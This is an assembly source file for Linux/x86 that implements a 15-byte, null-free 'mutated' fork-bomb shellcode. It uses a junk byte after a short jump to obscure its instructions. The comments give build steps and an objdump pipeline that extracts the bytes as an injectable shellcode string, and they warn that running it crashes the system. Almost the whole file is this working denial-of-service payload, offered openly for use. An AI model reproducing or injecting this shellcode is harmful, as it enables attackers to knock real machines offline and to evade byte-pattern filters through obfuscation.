; Mutated Fork Bomb - Assembly Language - Linux/x86
; Copyright (C) 2013 Geyslan G. Bem, Hacking bits
;
;   http://hackingbits.com
;   geyslan@gmail.com
;
; This program is free software: you can redistribute it and/or modify
; it under the terms of the GNU General Public License as published by
; the Free Software Foundation, either version 3 of the License, or
; (at your option) any later version.
;
; This program is distributed in the hope that it will be useful,
; but WITHOUT ANY WARRANTY; without even the implied warranty of
; MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
; GNU General Public License for more details.
;
; You should have received a copy of the GNU General Public License
; along with this program.  If not, see <http://www.gnu.org/licenses/>.


;   mutated_fork_bomb
;
;   * 15 bytes
;   * null-free
;   * mutated isn't polymorphic (shellcode does not replicate itself to be called polymorphic)
;
;
;   # nasm -f elf32 mutated_fork_bomb.asm
;   # ld -m elf_i386 mutated_fork_bomb.o -o mutated_fork_bomb
;   # for i in $(objdump -d mutated_fork_bomb |grep "^ " |cut -f2); do echo -n '\x'$i; done;echo
;   
;   Testing
;   * Only run it in a Virtual Machine!!! Your system will crash. Use at your own risk!


global _start

section .text

_start:
	xor edi, edi
	jmp $+3
	db 0xe8
	mov dl, 29
	xchg edi, eax
	sub eax, 27
	int 0x80
	jmp _start
